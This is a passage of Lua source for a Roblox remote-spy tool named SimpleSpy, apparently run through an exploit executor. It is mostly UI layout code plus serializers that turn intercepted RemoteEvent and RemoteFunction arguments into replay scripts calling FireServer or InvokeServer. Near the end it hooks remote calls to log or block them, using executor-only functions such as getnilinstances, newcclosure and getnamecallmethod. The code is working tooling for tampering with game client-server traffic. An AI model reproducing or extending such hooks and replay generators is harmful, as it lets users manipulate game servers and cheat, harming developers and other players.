        TweenService:Create(CodeBox, TweenInfo.new(0.5), {Size = UDim2.new(0.5, 0, 0.5, 0), Position = UDim2.new(0.25, 0, 0.25, 0)}):Play()
        TweenService:Create(disable, TweenInfo.new(0.5), {BackgroundTransparency = 0.5}):Play()
        disable.MouseButton1Click:Connect(function()
            if UserInputService:GetMouseLocation().Y + 36 >= CodeBox.AbsolutePosition.Y and UserInputService:GetMouseLocation().Y + 36 <= CodeBox.AbsolutePosition.Y + CodeBox.AbsoluteSize.Y
                and UserInputService:GetMouseLocation().X >= CodeBox.AbsolutePosition.X and UserInputService:GetMouseLocation().X <= CodeBox.AbsolutePosition.X + CodeBox.AbsoluteSize.X then
                return
            end
            TweenService:Create(CodeBox, TweenInfo.new(0.5), {Size = prevSize, Position = prevPos}):Play()
            TweenService:Create(disable, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
            wait(0.5)
            disable:Destroy()
            CodeBox.Size = UDim2.new(1, 0, 0.5, 0)
            CodeBox.Position = UDim2.new(0, 0, 0, 0)
            CodeBox.ZIndex = 0
            maximized = false
        end)
    end
end
 
--- Checks if cursor is within resize range
--- @param p Vector2
function isInResizeRange(p)
    local relativeP = p - Background.AbsolutePosition
    local range = 5
    if relativeP.X >= TopBar.AbsoluteSize.X - range and relativeP.Y >= Background.AbsoluteSize.Y - range
        and relativeP.X <= TopBar.AbsoluteSize.X and relativeP.Y <= Background.AbsoluteSize.Y then
        return true, 'B'
    elseif relativeP.X >= TopBar.AbsoluteSize.X - range and relativeP.X <= Background.AbsoluteSize.X then
        return true, 'X'
    elseif relativeP.Y >= Background.AbsoluteSize.Y - range and relativeP.Y <= Background.AbsoluteSize.Y then
        return true, 'Y'
    end
    return false
end
 
--- Called when mouse enters SimpleSpy
function mouseEntered()
    local customCursor = Instance.new("ImageLabel")
    customCursor.Size = UDim2.fromOffset(200, 200)
    customCursor.ZIndex = 1e5
    customCursor.BackgroundTransparency = 1
    customCursor.Image = ""
    customCursor.Parent = SimpleSpy2
    UserInputService.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.ForceHide
    RunService:BindToRenderStep("SIMPLESPY_CURSOR", 1, function()
        if mouseInGui and _G.SimpleSpyExecuted then
            local mouseLocation = UserInputService:GetMouseLocation() - Vector2.new(0, 36)
            customCursor.Position = UDim2.fromOffset(mouseLocation.X - customCursor.AbsoluteSize.X / 2, mouseLocation.Y - customCursor.AbsoluteSize.Y / 2)
            local inRange, type = isInResizeRange(mouseLocation)
            if inRange and not sideClosed and not closed then
                customCursor.Image = type == 'B' and "rbxassetid://6065821980" or type == 'X' and "rbxassetid://6065821086" or type == 'Y' and "rbxassetid://6065821596"
            elseif inRange and not closed and type == 'Y' or type == 'B' then
                customCursor.Image = "rbxassetid://6065821596"
            elseif customCursor.Image ~= "rbxassetid://6065775281" then
                customCursor.Image = "rbxassetid://6065775281"
            end
        else
            UserInputService.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.None
            customCursor:Destroy()
            RunService:UnbindFromRenderStep("SIMPLESPY_CURSOR")
        end
    end)
end
 
--- Called when mouse moves
function mouseMoved()
    local mousePos = UserInputService:GetMouseLocation() - Vector2.new(0, 36)
    if not closed
    and mousePos.X >= TopBar.AbsolutePosition.X and mousePos.X <= TopBar.AbsolutePosition.X + TopBar.AbsoluteSize.X
    and mousePos.Y >= Background.AbsolutePosition.Y and mousePos.Y <= Background.AbsolutePosition.Y + Background.AbsoluteSize.Y then
        if not mouseInGui then
            mouseInGui = true
            mouseEntered()
        end
    else
        mouseInGui = false
    end
end
 
--- Adjusts the ui elements to the 'Maximized' size
function maximizeSize(speed)
    if not speed then
        speed = 0.05
    end
    TweenService:Create(LeftPanel, TweenInfo.new(speed), { Size = UDim2.fromOffset(LeftPanel.AbsoluteSize.X, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y) }):Play()
    TweenService:Create(RightPanel, TweenInfo.new(speed), { Size = UDim2.fromOffset(Background.AbsoluteSize.X - LeftPanel.AbsoluteSize.X, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y) }):Play()
    TweenService:Create(TopBar, TweenInfo.new(speed), { Size = UDim2.fromOffset(Background.AbsoluteSize.X, TopBar.AbsoluteSize.Y) }):Play()
    TweenService:Create(ScrollingFrame, TweenInfo.new(speed), { Size = UDim2.fromOffset(Background.AbsoluteSize.X - LeftPanel.AbsoluteSize.X, 110), Position = UDim2.fromOffset(0, Background.AbsoluteSize.Y - 119 - TopBar.AbsoluteSize.Y) }):Play()
    TweenService:Create(CodeBox, TweenInfo.new(speed), { Size = UDim2.fromOffset(Background.AbsoluteSize.X - LeftPanel.AbsoluteSize.X, Background.AbsoluteSize.Y - 119 - TopBar.AbsoluteSize.Y) }):Play()
    TweenService:Create(LogList, TweenInfo.new(speed), { Size = UDim2.fromOffset(LogList.AbsoluteSize.X, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y - 18) }):Play()
end
 
--- Adjusts the ui elements to close the side
function minimizeSize(speed)
    if not speed then
        speed = 0.05
    end
    TweenService:Create(LeftPanel, TweenInfo.new(speed), { Size = UDim2.fromOffset(LeftPanel.AbsoluteSize.X, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y) }):Play()
    TweenService:Create(RightPanel, TweenInfo.new(speed), { Size = UDim2.fromOffset(0, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y) }):Play()
    TweenService:Create(TopBar, TweenInfo.new(speed), { Size = UDim2.fromOffset(LeftPanel.AbsoluteSize.X, TopBar.AbsoluteSize.Y) }):Play()
    TweenService:Create(ScrollingFrame, TweenInfo.new(speed), { Size = UDim2.fromOffset(0, 119), Position = UDim2.fromOffset(0, Background.AbsoluteSize.Y - 119 - TopBar.AbsoluteSize.Y) }):Play()
    TweenService:Create(CodeBox, TweenInfo.new(speed), { Size = UDim2.fromOffset(0, Background.AbsoluteSize.Y - 119 - TopBar.AbsoluteSize.Y) }):Play()
    TweenService:Create(LogList, TweenInfo.new(speed), { Size = UDim2.fromOffset(LogList.AbsoluteSize.X, Background.AbsoluteSize.Y - TopBar.AbsoluteSize.Y - 18) }):Play()
end
 
--- Called on user input while mouse in 'Background' frame
--- @param input InputObject
function backgroundUserInput(input)
    local inRange, type = isInResizeRange(UserInputService:GetMouseLocation() - Vector2.new(0, 36))
    if input.UserInputType == Enum.UserInputType.MouseButton1 and inRange then
        local lastPos = UserInputService:GetMouseLocation()
        local offset = Background.AbsoluteSize - lastPos
        local currentPos = lastPos + offset
        RunService:BindToRenderStep("SIMPLESPY_RESIZE", 1, function()
            local newPos = UserInputService:GetMouseLocation()
            if newPos ~= lastPos then
                local currentX = (newPos + offset).X
                local currentY = (newPos + offset).Y
                if currentX < 450 then
                    currentX = 450
                end
                if currentY < 268 then
                    currentY = 268
                end
                currentPos = Vector2.new(currentX, currentY)
                Background.Size = UDim2.fromOffset((not sideClosed and not closed and (type == "X" or type == "B")) and currentPos.X or Background.AbsoluteSize.X, (--[[(not sideClosed or currentPos.X <= LeftPanel.AbsolutePosition.X + LeftPanel.AbsoluteSize.X) and]] not closed and (type == "Y" or type == "B")) and currentPos.Y or Background.AbsoluteSize.Y)
                if sideClosed then
                    minimizeSize()
                else
                    maximizeSize()
                end
                lastPos = newPos
            end
        end)
        table.insert(connections, UserInputService.InputEnded:Connect(function(inputE)
            if input == inputE then
                RunService:UnbindFromRenderStep("SIMPLESPY_RESIZE")
            end
        end))
    end
end
 
--- Gets the player an instance is descended from
function getPlayerFromInstance(instance)
    for _, v in pairs(Players:GetPlayers()) do
        if v.Character and (instance:IsDescendantOf(v.Character) or instance == v.Character) then
            return v
        end
    end
end
 
--- Runs on MouseButton1Click of an event frame
function eventSelect(frame)
    if selected and selected.Log  then
        TweenService:Create(selected.Log.Button, TweenInfo.new(0.5), {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}):Play()
        selected = nil
    end
    for _, v in pairs(logs) do
        if frame == v.Log then
            selected = v
        end
    end
    if selected and selected.Log then
        TweenService:Create(frame.Button, TweenInfo.new(0.5), {BackgroundColor3 = Color3.fromRGB(92, 126, 229)}):Play()
        codebox:setRaw(selected.GenScript)
    end
    if sideClosed then
        toggleSideTray()
    end
end
 
--- Updates the canvas size to fit the current amount of function buttons
function updateFunctionCanvas()
    ScrollingFrame.CanvasSize = UDim2.fromOffset(UIGridLayout.AbsoluteContentSize.X, UIGridLayout.AbsoluteContentSize.Y)
end
 
--- Updates the canvas size to fit the amount of current remotes
function updateRemoteCanvas()
    LogList.CanvasSize = UDim2.fromOffset(UIListLayout.AbsoluteContentSize.X, UIListLayout.AbsoluteContentSize.Y)
end
 
--- Allows for toggling of the tooltip and easy setting of le description
--- @param enable boolean
--- @param text string
function makeToolTip(enable, text)
    if enable then
        if ToolTip.Visible then
            ToolTip.Visible = false
            RunService:UnbindFromRenderStep("ToolTip")
        end
        local first = true
        RunService:BindToRenderStep("ToolTip", 1, function()
            local topLeft = Vector2.new(Mouse.X + 20, Mouse.Y + 20)
            local bottomRight = topLeft + ToolTip.AbsoluteSize
            if topLeft.X < 0 then
                topLeft = Vector2.new(0, topLeft.Y)
            elseif bottomRight.X > workspace.CurrentCamera.ViewportSize.X then
                topLeft = Vector2.new(workspace.CurrentCamera.ViewportSize.X - ToolTip.AbsoluteSize.X, topLeft.Y)
            end
            if topLeft.Y < 0 then
                topLeft = Vector2.new(topLeft.X, 0)
            elseif bottomRight.Y > workspace.CurrentCamera.ViewportSize.Y - 35 then
                topLeft = Vector2.new(topLeft.X, workspace.CurrentCamera.ViewportSize.Y - ToolTip.AbsoluteSize.Y - 35)
            end
            if topLeft.X <= Mouse.X and topLeft.Y <= Mouse.Y then
                topLeft = Vector2.new(Mouse.X - ToolTip.AbsoluteSize.X - 2, Mouse.Y - ToolTip.AbsoluteSize.Y - 2)
            end
            if first then
                ToolTip.Position = UDim2.fromOffset(topLeft.X, topLeft.Y)
                first = false
            else
                ToolTip:TweenPosition(UDim2.fromOffset(topLeft.X, topLeft.Y), "Out", "Linear", 0.1)
            end
        end)
        TextLabel.Text = text
        ToolTip.Visible = true
    else
        if ToolTip.Visible then
            ToolTip.Visible = false
            RunService:UnbindFromRenderStep("ToolTip")
        end
    end
end
 
--- Creates new function button (below codebox)
--- @param name string
---@param description function
---@param onClick function
function newButton(name, description, onClick)
    local button = FunctionTemplate:Clone()
    button.Text.Text = name
    button.Button.MouseEnter:Connect(function()
        makeToolTip(true, description())
    end)
    button.Button.MouseLeave:Connect(function()
        makeToolTip(false)
    end)
    button.AncestryChanged:Connect(function()
        makeToolTip(false)
    end)
    button.Button.MouseButton1Click:Connect(function(...)
        onClick(button, ...)
    end)
    button.Parent = ScrollingFrame
    updateFunctionCanvas()
end
 
--- Adds new Remote to logs
--- @param name string The name of the remote being logged
--- @param type string The type of the remote being logged (either 'function' or 'event')
--- @param gen_script any
--- @param remote any
--- @param function_info string
--- @param blocked any
function newRemote(type, name, gen_script, remote, function_info, blocked, src)
    local remoteFrame = RemoteTemplate:Clone()
    remoteFrame.Text.Text = name
    remoteFrame.ColorBar.BackgroundColor3 = type == "event" and Color3.new(255, 242, 0) or Color3.fromRGB(99, 86, 245)
    local id = Instance.new("IntValue")
    id.Name = "ID"
    id.Value = #logs + 1
    id.Parent = remoteFrame
    logs[#logs + 1] = {
        Name = name,
        GenScript = gen_script,
        Function = function_info,
        Remote = remote,
        Log = remoteFrame,
        Blocked = blocked,
        Source = src
    }
    if blocked then
        logs[#logs].GenScript = "-- THIS REMOTE WAS PREVENTED FROM FIRING THE SERVER BY SIMPLESPY\n\n" .. logs[#logs].GenScript
    end
    local connect = remoteFrame.Button.MouseButton1Click:Connect(function()
        eventSelect(remoteFrame)
    end)
    if layoutOrderNum < 1 then
        layoutOrderNum = 999999999
    end
    remoteFrame.LayoutOrder = layoutOrderNum
    layoutOrderNum = layoutOrderNum - 1
    remoteFrame.Parent = LogList
    table.insert(remoteLogs, 1, {connect, remoteFrame})
    clean()
    updateRemoteCanvas()
end
 
--- Generates a script from the provided arguments (first has to be remote path)
function genScript(remote, ...)
    prevTables = {}
    local gen = ""
    local args = {...}
    if #args > 0 then
        if not pcall(function()
                gen = v2v({args = args}) .. "\n"
            end)
        then
            gen = gen .. "-- TableToString failure! Reverting to legacy functionality (results may vary)\nlocal args = {"
            if
                not pcall(
                    function()
                        for i, v in pairs(args) do
                            if type(i) ~= "Instance" and type(i) ~= "userdata" then
                                gen = gen .. "\n    [" .. tostring(i) .. "] = "
                            elseif type(i) == "string" then
                                gen = gen .. '\n    ["' .. tostring(i) .. '"] = '
                            elseif type(i) == "userdata" and typeof(i) ~= "Instance" then
                                gen = gen .. "\n    [" .. typeof(i) .. ".new(" .. tostring(i) .. ")] = "
                            elseif type(i) == "userdata" then
                                gen = gen .. "\n    [game." .. i:GetFullName() .. ")] = "
                            end
                            if type(v) ~= "Instance" and type(v) ~= "userdata" then
                                gen = gen .. tostring(v)
                            elseif type(v) == "string" then
                                gen = gen .. '"' .. tostring(v) .. '"'
                            elseif type(v) == "userdata" and typeof(v) ~= "Instance" then
                                gen = gen .. typeof(v) .. ".new(" .. tostring(v) .. ")"
                            elseif type(v) == "userdata" then
                                gen = gen .. "game." .. v:GetFullName()
                            end
                        end
                        gen = gen .. "\n}\n\n"
                    end
                )
             then
                gen = gen .. "}\n-- Legacy tableToString failure! Unable to decompile."
            end
        end
        if not remote:IsDescendantOf(game) and not getnilrequired then
            gen = "function getNil(name,class) for _,v in pairs(getnilinstances())do if v.ClassName==class and v.Name==name then return v;end end end\n\n" .. gen
        end
        if remote:IsA("RemoteEvent") then
            gen = gen .. v2s(remote) .. ":FireServer(unpack(args))"
        elseif remote:IsA("RemoteFunction") then
            gen = gen .. v2s(remote) .. ":InvokeServer(unpack(args))"
        end
    else
        if remote:IsA("RemoteEvent") then
            gen = gen .. v2s(remote) .. ":FireServer()"
        elseif remote:IsA("RemoteFunction") then
            gen = gen .. v2s(remote) .. ":InvokeServer()"
        end
    end
    gen = "" .. gen
    prevTables = {}
    return gen
end
 
--- value-to-string: value, string (out), level (indentation), parent table, var name, is from tovar
function v2s(v, l, p, n, vtv, i, pt, path, tables)
    if typeof(v) == "number" then
        if v == math.huge then
            return "math.huge"
        elseif tostring(v):match("nan") then
            return "0/0 --[[NaN]]"
        end
        return tostring(v)
    elseif typeof(v) == "boolean" then
        return tostring(v)
    elseif typeof(v) == "string" then
        return formatstr(v)
    elseif typeof(v) == "function" then
        return f2s(v)
    elseif typeof(v) == "table" then
        return t2s(v, l, p, n, vtv, i, pt, path, tables)
    elseif typeof(v) == "Instance" then
        return i2p(v)
    elseif typeof(v) == "userdata" then
        return "newproxy(true)"
    elseif type(v) == "userdata" then
        return u2s(v)
    else
        return "nil --[[" .. typeof(v) .. "]]"
    end
end
 
--- value-to-variable
--- @param t any
function v2v(t)
    topstr = ""
    bottomstr = ""
    getnilrequired = false
    local ret = ""
    local count = 1
    for i, v in pairs(t) do
        if type(i) == "string" and i:match("^[%a_]+[%w_]*$") then
            ret = ret .. "local " .. i .. " = " .. v2s(v, nil, nil, i, true) .. "\n"
        elseif tostring(i):match("^[%a_]+[%w_]*$") then
            ret = ret .. "local " .. tostring(i):lower() .. "_" .. tostring(count) .. " = " .. v2s(v, nil, nil, tostring(i):lower() .. "_" .. tostring(count), true) .. "\n"
        else
            ret = ret .. "local " .. type(v) .. "_" .. tostring(count) .. " = " .. v2s(v, nil, nil, type(v) .. "_" .. tostring(count), true) .. "\n"
        end
        count = count + 1
    end
    if getnilrequired then
        topstr = "function getNil(name,class) for _,v in pairs(getnilinstances())do if v.ClassName==class and v.Name==name then return v;end end end\n" .. topstr
    end
    if #topstr > 0 then
        ret = topstr .. "\n" .. ret
    end
    if #bottomstr > 0 then
        ret = ret .. bottomstr
    end
    return ret
end
 
--- table-to-string
--- @param t table
--- @param l number
--- @param p table
--- @param n string
--- @param vtv boolean
--- @param i any
--- @param pt table
--- @param path string
--- @param tables table
function t2s(t, l, p, n, vtv, i, pt, path, tables)
    for k, x in pairs(getrenv()) do
        local isgucci, gpath
        if rawequal(x, t) then
            isgucci, gpath = true, ""
        elseif type(x) == "table" then
            isgucci, gpath = v2p(t, x)
        end
        if isgucci then
            if type(k) == "string" and k:match("^[%a_]+[%w_]*$") then
                return k .. gpath
            else
                return "getrenv()[" .. v2s(k) .. "]" .. gpath
            end
        end
    end
    if not path then
        path = ""
    end
    if not l then
        l = 0
        tables = {}
    end
    if not p then
        p = t
    end
    for _, v in pairs(tables) do
        if n and rawequal(v, t) then
            bottomstr = bottomstr .. "\n" .. tostring(n) .. tostring(path) .. " = " .. tostring(n) .. tostring(({v2p(v, p)})[2])
            return "{} --[[DUPLICATE]]"
        end
    end
    table.insert(tables, t)
    local s =  "{"
    local size = 0
    l = l + indent
    for k, v in pairs(t) do
        size = size + 1
        if size > (_G.SimpleSpyMaxTableSize and _G.SimpleSpyMaxTableSize or 1000) then
            break
        end
        if rawequal(k, t) then
            bottomstr = bottomstr .. "\n" .. tostring(n) .. tostring(path) .. "[" .. tostring(n) .. tostring(path) .. "]" .. " = " .. (v == k and tostring(n) .. tostring(path) or v2s(v, l, p, n, vtv, k, t, path .. "[" .. tostring(n) .. tostring(path) .. "]", tables))
            size -= 1
            continue
        end
        local currentPath = ""
        if type(k) == "string" and k:match("^[%a_]+[%w_]*$") then
            currentPath = "." .. k
        else
            currentPath = "[" .. v2s(k, nil, p, n, vtv, i, pt, path) .. "]"
        end
        s = s .. "\n" .. string.rep(" ", l) .. "[" .. v2s(k, l, p, n, vtv, k, t, path .. currentPath, tables) .. "] = " .. v2s(v, l, p, n, vtv, k, t, path .. currentPath, tables) .. ","
    end
    if #s > 1 then
        s = s:sub(1, #s - 1)
    end
    if size > 0 then
        s = s .. "\n" .. string.rep(" ", l - indent)
    end
    return s .. "}"
end
 
--- function-to-string
function f2s(f)
    for k, x in pairs(getgenv()) do
        local isgucci, gpath
        if rawequal(x, f) then
            isgucci, gpath = true, ""
        elseif type(x) == "table" then
            isgucci, gpath = v2p(f, x)
        end
        if isgucci then
            if type(k) == "string" and k:match("^[%a_]+[%w_]*$") then
                return k .. gpath
            else
                return "getgenv()[" .. v2s(k) .. "]" .. gpath
            end
        end
    end
    -- uwu some cool stuff here once bork finishes up
    -- if SimpleSpy.GetExternalLoader then
    --     local ExternalLoader = SimpleSpy:GetExternalLoader()
    --     local loaded, path = pcall(function() ExternalLoader:LoadAsset("Bork_Functions") end)
    --     if loaded then
    --         local functions = loadfile(path .. "functions.lua")
    --         local out = functions[f]
    --         if out then
    --             return out
    --         end
    --     end
    -- end
    -- local isgucci, gpath = v2p(f, getgc())
    -- if isgucci then
    --     return "getgc()" .. gpath
    -- end
    if debug.getinfo(f).name:match("^[%a_]+[%w_]*$") then
        return "function()end --[[" .. debug.getinfo(f).name .. "]]"
    end
    return "function()end --[[" .. tostring(f) .. "]]"
end
 
--- instance-to-path
--- @param i userdata
function i2p(i)
    local player = getplayer(i)
    local parent = i
    local out = ""
    if parent == nil then
        return "nil"
    elseif player then
        while true do
            if parent and parent == player.Character then
                if player == Players.LocalPlayer then
                    return 'game:GetService("Players").LocalPlayer.Character' .. out
                else
                    return i2p(player) .. ".Character" .. out
                end
            else
                if parent.Name:match("[%a_]+[%w+]*") ~= parent.Name then
                    out = '[' .. formatstr(parent.Name) .. ']' .. out
                else
                    out = "." .. parent.Name .. out
                end
            end
            parent = parent.Parent
        end
    elseif parent ~= game then
        while true do
            if parent and parent.Parent == game then
                if game:GetService(parent.ClassName) then
                    if parent.ClassName == "Workspace" then
                        return "workspace" .. out
                    else
                        return 'game:GetService("' .. parent.ClassName .. '")' .. out
                    end
                else
                    if parent.Name:match("[%a_]+[%w_]*") then
                        return "game." .. parent.Name .. out
                    else
                        return 'game[' .. formatstr(parent.Name) .. ']' .. out
                    end
                end
            elseif parent.Parent == nil then
                getnilrequired = true
                return 'getNil(' .. formatstr(parent.Name) .. ', "' .. parent.ClassName .. '")' .. out
            elseif parent == Players.LocalPlayer then
                out = ".LocalPlayer" .. out
            else
                if parent.Name:match("[%a_]+[%w_]*") ~= parent.Name then
                    out = '[' .. formatstr(parent.Name) .. ']' .. out
                else
                    out = "." .. parent.Name .. out
                end
            end
            parent = parent.Parent
        end
    else
        return "game"
    end
end
 
--- userdata-to-string: userdata
--- @param u userdata
function u2s(u)
    if typeof(u) == "TweenInfo" then
        -- TweenInfo
        return "TweenInfo.new(" ..tostring(u.Time) .. ", Enum.EasingStyle." .. tostring(u.EasingStyle) .. ", Enum.EasingDirection." .. tostring(u.EasingDirection) .. ", " .. tostring(u.RepeatCount) .. ", " .. tostring(u.Reverses) .. ", " .. tostring(u.DelayTime) .. ")"
    elseif typeof(u) == "Ray" then
        -- Ray
        return "Ray.new(" .. u2s(u.Origin) .. ", " .. u2s(u.Direction) .. ")"
    elseif typeof(u) == "NumberSequence" then
        -- NumberSequence
        local ret = "NumberSequence.new("
        for i, v in pairs(u.KeyPoints) do
            ret = ret .. tostring(v)
            if i < #u.Keypoints then
                ret = ret .. ", "
            end
        end
        return ret .. ")"
    elseif typeof(u) == "DockWidgetPluginGuiInfo" then
        -- DockWidgetPluginGuiInfo
        return "DockWidgetPluginGuiInfo.new(Enum.InitialDockState" .. tostring(u) .. ")"
    elseif typeof(u) == "ColorSequence" then
        -- ColorSequence
        local ret = "ColorSequence.new("
        for i, v in pairs(u.KeyPoints) do
            ret = ret .. "Color3.new(" .. tostring(v) .. ")"
            if i < #u.Keypoints then
                ret = ret .. ", "
            end
        end
        return ret .. ")"
    elseif typeof(u) == "BrickColor" then
        -- BrickColor
        return "BrickColor.new(" .. tostring(u.Number) .. ")"
    elseif typeof(u) == "NumberRange" then
        -- NumberRange
        return "NumberRange.new(" .. tostring(u.Min) .. ", " .. tostring(u.Max) .. ")"
    elseif typeof(u) == "Region3" then
        -- Region3
        local center = u.CFrame.Position
        local size = u.CFrame.Size
        local vector1 = center - size / 2
        local vector2 = center + size / 2
        return "Region3.new(" .. u2s(vector1) .. ", " .. u2s(vector2) .. ")"
    elseif typeof(u) == "Faces" then
        -- Faces
        local faces = {}
        if u.Top then
            table.insert(faces, "Enum.NormalId.Top")
        end
        if u.Bottom then
            table.insert(faces, "Enum.NormalId.Bottom")
        end
        if u.Left then
            table.insert(faces, "Enum.NormalId.Left")
        end
        if u.Right then
            table.insert(faces, "Enum.NormalId.Right")
        end
        if u.Back then
            table.insert(faces, "Enum.NormalId.Back")
        end
        if u.Front then
            table.insert(faces, "Enum.NormalId.Front")
        end
        return "Faces.new(" .. table.concat(faces, ", ") .. ")"
    elseif typeof(u) == "EnumItem" then
        return tostring(u)
    elseif typeof(u) == "Enums" then
        return "Enum"
    elseif typeof(u) == "Enum" then
        return "Enum." .. tostring(u)
    elseif typeof(u) == "RBXScriptSignal" then
        return "nil --[[RBXScriptSignal]]"
    elseif typeof(u) == "Vector3" then
        return string.format("Vector3.new(%s, %s, %s)", v2s(u.X), v2s(u.Y), v2s(u.Z))
    elseif typeof(u) == "CFrame" then
        return string.format("CFrame.new(%s, %s)", v2s(u.Position), v2s(u.LookVector))
    elseif typeof(u) == "DockWidgetPluginGuiInfo" then
        return string.format("DockWidgetPluginGuiInfo(%s, %s, %s, %s, %s, %s, %s)", "Enum.InitialDockState.Right", v2s(u.InitialEnabled), v2s(u.InitialEnabledShouldOverrideRestore), v2s(u.FloatingXSize), v2s(u.FloatingYSize), v2s(u.MinWidth), v2s(u.MinHeight))
    elseif typeof(u) == "RBXScriptConnection" then
        return "nil --[[RBXScriptConnection " .. tostring(u) .. "]]"
    elseif typeof(u) == "RaycastResult" then
        return "nil --[[RaycastResult " .. tostring(u) .. "]]"
    elseif typeof(u) == "PathWaypoint" then
        return string.format("PathWaypoint.new(%s, %s)", v2s(u.Position), v2s(u.Action))
    else
        return typeof(u) .. ".new(" .. tostring(u) .. ")"
    end
end
 
--- Gets the player an instance is descended from
function getplayer(instance)
    for _, v in pairs(Players:GetPlayers()) do
        if v.Character and (instance:IsDescendantOf(v.Character) or instance == v.Character) then
            return v
        end
    end
end
 
--- value-to-path (in table)
function v2p(x, t, path, prev)
    if not path then
        path = ""
    end
    if not prev then
        prev = {}
    end
    if rawequal(x, t) then
        return true, ""
    end
    for i, v in pairs(t) do
        if rawequal(v, x) then
            if type(i) == "string" and i:match("^[%a_]+[%w_]*$") then
                return true, (path .. "." .. i)
            else
                return true, (path .. "[" .. v2s(i) .. "]")
            end
        end
        if type(v) == "table" then
            local duplicate = false
            for _, y in pairs(prev) do
                if rawequal(y, v) then
                    duplicate = true
                end
            end
            if not duplicate then
                table.insert(prev, t)
                local found
                found, p = v2p(x, v, path, prev)
                if found then
                    if type(i) == "string" and i:match("^[%a_]+[%w_]*$") then
                        return true, "." .. i .. p
                    else
                        return true, "[" .. v2s(i) .. "]" .. p
                    end
                end
            end
        end
    end
    return false, ""
end
 
--- format s: string, byte encrypt (for weird symbols)
function formatstr(s)
    return '"' .. handlespecials(s) .. '"'
end
 
--- Adds \'s to the text as a replacement to whitespace chars and other things because string.format can't yayeet
function handlespecials(s)
    local i = 0
    repeat
        i = i + 1
        local char = s:sub(i, i)
        if string.byte(char) then
            if char == "\n" then
                s = s:sub(0, i - 1) .. "\\n" .. s:sub(i + 1, -1)
                i = i + 1
            elseif char == "\t" then
                s = s:sub(0, i - 1) .. "\\t" .. s:sub(i + 1, -1)
                i = i + 1
            elseif char == "\\" then
                s = s:sub(0, i - 1) .. "\\\\" .. s:sub(i + 1, -1)
                i = i + 1
            elseif char == '"' then
                s = s:sub(0, i - 1) .. '\\"' .. s:sub(i + 1, -1)
                i = i + 1
            elseif string.byte(char) > 126 or string.byte(char) < 32 then
                s = s:sub(0, i - 1) .. "\\" .. string.byte(char) .. s:sub(i + 1, -1)
                i = i + #tostring(string.byte(char))
            end
        end
    until char == ""
    return s
end
 
--- finds script from 'src' from getinfo, returns nil if not found
--- @param src string
function getScriptFromSrc(src)
    local realPath
    local runningTest
    --- @type number
    local s, e
    local match = false
    if src:sub(1, 1) == "=" then
        realPath = game
        s = 2
    else
        runningTest = src:sub(2, e and e - 1 or -1)
        for _, v in pairs(getnilinstances()) do
            if v.Name == runningTest then
                realPath = v
                break
            end
        end
        s = #runningTest + 1
    end
    if realPath then
        e = src:sub(s, -1):find("%.")
        local i = 0
        repeat
            i += 1
            if not e then
                runningTest = src:sub(s, -1)
                local test = realPath.FindFirstChild(realPath, runningTest)
                if test then
                    realPath = test
                end
                match = true
            else
                runningTest = src:sub(s, e)
                local test = realPath.FindFirstChild(realPath, runningTest)
                local yeOld = e
                if test then
                    realPath = test
                    s = e + 2
                    e = src:sub(e + 2, -1):find("%.")
                    e = e and e + yeOld or e
                else
                    e = src:sub(e + 2, -1):find("%.")
                    e = e and e + yeOld or e
                end
            end
        until match or i >= 50
    end
    return realPath
end
 
--- schedules the provided function (and calls it with any args after)
function schedule(f, ...)
    table.insert(scheduled, {f, ...})
end
 
--- the big (well tbh small now) boi task scheduler himself, handles p much anything as quicc as possible
function taskscheduler()
    if not toggle then
        scheduled = {}
        return
    end
    if #scheduled > 1000 then
        table.remove(scheduled, #scheduled)
    end
    if #scheduled > 0 then
        local currentf = scheduled[1]
        table.remove(scheduled, 1)
        if type(currentf) == "table" and type(currentf[1]) == "function" then
            pcall(unpack(currentf))
        end
    end
end
 
--- Handles remote logs
function remoteHandler(hookfunction, methodName, remote, args, func, calling)
    if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
        if funcEnabled and not calling then
            _, calling = pcall(getScriptFromSrc, debug.getinfo(func).source)
        end
        coroutine.wrap(function()
            if remoteSignals[remote] then
                remoteSignals[remote]:Fire(args)
            end
        end)()
        if autoblock then
            if excluding[remote] then
                return
            end
            if not history[remote] then
                history[remote] = {badOccurances = 0, lastCall = tick()}
            end
            if tick() - history[remote].lastCall < 1 then
                history[remote].badOccurances += 1
                return
            else
                history[remote].badOccurances = 0
            end
            if history[remote].badOccurances > 3 then
                excluding[remote] = true
                return
            end
            history[remote].lastCall = tick()
        end
        local functionInfoStr
        local src
        if func and islclosure(func) then
            local functionInfo = {}
            pcall(function() functionInfo.info = debug.getinfo(func) end)
            pcall(function() functionInfo.constants = debug.getconstants(func) end)
            pcall(function() functionInfoStr = v2v{functionInfo = functionInfo} end)
            pcall(function() if type(calling) == "userdata" then src = calling end end)
        end
        if methodName:lower() == "fireserver" then
            newRemote("event", remote.Name, genScript(remote, table.unpack(args)), remote, functionInfoStr, (blocklist[remote] or blocklist[remote.Name]), src)
        elseif methodName:lower() == "invokeserver" then
            newRemote("function", remote.Name, genScript(remote, table.unpack(args)), remote, functionInfoStr, (blocklist[remote] or blocklist[remote.Name]), src)
        end
    end
end
 
--- Used for hookfunction
function hookRemote(remoteType, remote, ...)
    local args = {...}
    if remoteHooks[remote] then
        args = remoteHooks[remote](args)
    end
    if typeof(remote) == "Instance" and not (blacklist[remote] or blacklist[remote.Name]) then
        local func
        local calling
        if funcEnabled then
            func = debug.getinfo(4).func
            calling = useGetCallingScript and getcallingscript() or nil
        end
        schedule(remoteHandler, true, remoteType == "RemoteEvent" and "fireserver" or "invokeserver", remote, args, func, calling)
        if (blocklist[remote] or blocklist[remote.Name]) then
            return
        end
    end
    if remoteType == "RemoteEvent" then
        if remoteHooks[remote] then
            return originalEvent(remote, unpack(args))
        end
        return originalEvent(remote, ...)
    else
        if remoteHooks[remote] then
            return originalFunction(remote, unpack(args))
        end
        return originalFunction(remote, ...)
    end
end
 
local newnamecall = newcclosure(function(...)
    local args = {...}
    local methodName = getnamecallmethod()
    local remote = args[1]
